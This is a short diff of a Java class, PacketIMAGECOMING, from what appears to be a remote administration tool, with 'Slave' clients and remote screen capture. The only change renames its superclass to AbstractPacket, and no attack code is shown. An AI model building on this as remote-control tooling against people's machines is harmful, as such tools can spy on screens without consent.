@@ -19,7 +19,7 @@ import com.redpois0n.ui.frames.FrameRemoteScreen;
 import com.redpois0n.utils.ImageUtils;
 
 
-public class PacketIMAGECOMING extends Packet {
+public class PacketIMAGECOMING extends AbstractPacket {
 
 	public boolean requestAgain = true;
 	public static final HashMap<Slave, RemoteScreenData> instances = new HashMap<Slave, RemoteScreenData>();
